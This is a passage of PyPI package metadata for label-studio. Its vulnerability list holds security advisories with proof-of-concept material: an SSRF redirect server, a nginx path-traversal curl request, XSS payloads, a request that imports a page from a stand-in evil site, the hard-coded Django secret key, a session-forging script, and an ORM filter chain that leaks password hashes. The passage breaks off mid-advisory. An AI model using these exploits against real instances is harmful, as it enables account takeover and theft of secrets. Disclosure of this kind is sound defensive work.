36240d3e78cd0a","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6852816,"upload_time":"2020-10-08T14:25:47","upload_time_iso_8601":"2020-10-08T14:25:47.466262Z","url":"https://files.pythonhosted.org/packages/a5/4e/da190969b0cb2394235afaedef5bbc3fa943a76a3d2531601e806cc89af6/label-studio-0.7.4.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # 